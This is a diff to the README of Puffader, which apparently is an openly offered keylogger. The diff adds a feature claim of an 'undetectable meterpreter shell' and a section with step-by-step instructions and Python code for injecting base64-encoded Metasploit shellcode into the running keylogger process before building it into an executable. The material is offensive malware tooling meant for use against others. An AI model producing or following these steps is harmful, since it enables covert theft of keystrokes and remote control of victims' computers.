@@ -25,6 +25,7 @@ Currently Puffader has several features such as:
 * Ability to control how you want the backspace key to be outputed as.
 * Ability to stop the program via ctrl-rshift-h.
 * Ability to log special characters.
+* Ability to embed an undetectable meterpreter shell
 * Optional persistence.
 * Ability to capture window mouse clicks
 * Checking for multiple instances
@@ -77,6 +78,23 @@ For more information please refer to the [wiki](https://github.com/xp4xbox/Puffa
 2. Run `python cx_freeze_setup.py build`.
 
 Or refer to the [wiki](https://github.com/xp4xbox/Puffader/wiki/Compiling-To-.exe) for more information.
+
+## Adding Meterpreter Plugin
+
+1. Generate raw shellcode using metasploit (eg. xr8\x02...).
+2. Encode the shellcode to base64 by using [this](https://github.com/xp4xbox/Puffader/blob/master/Meterpreter_Plugin/base64encoder.py).
+3. Move the [code_injector module](https://github.com/xp4xbox/Puffader/blob/master/Meterpreter_Plugin/code_injector.py) to same dir as the program.
+4. Paste in this code afther the function to prevent multiple instances. Setting b64shellcode to be your encrypted shellcode
+```
+import code_injector, base64
+# base64 shellcode
+b64shellcode = ""
+shellcode = base64.b64decode(b64shellcode)  # decrypt shellcode
+pid = os.getpid()  # get current pid
+
+code_injector.InjectShellCode(pid, shellcode)  # inject the shellcode into the program
+```
+5. Build program with py2exe using [setup.py](https://github.com/xp4xbox/Puffader/blob/master/Meterpreter_Plugin/setup.py)
 
 ## Help
 
